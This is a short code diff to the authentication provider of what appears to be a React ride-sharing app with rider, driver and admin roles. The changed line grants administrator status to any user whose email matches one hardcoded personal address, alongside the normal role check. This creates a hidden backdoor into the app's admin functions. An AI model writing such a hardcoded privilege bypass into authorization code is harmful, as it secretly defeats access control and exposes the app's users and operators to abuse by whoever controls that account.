@@ -757,7 +757,7 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
 
   const isRider = roles.includes('rider');
   const isDriver = roles.includes('driver');
-  const isAdmin = roles.includes('admin');
+  const isAdmin = roles.includes('admin') || user?.email?.toLowerCase() === 'alsenesa@hotmail.com';
 
   const isLoading = authLoading || profileLoading;
 
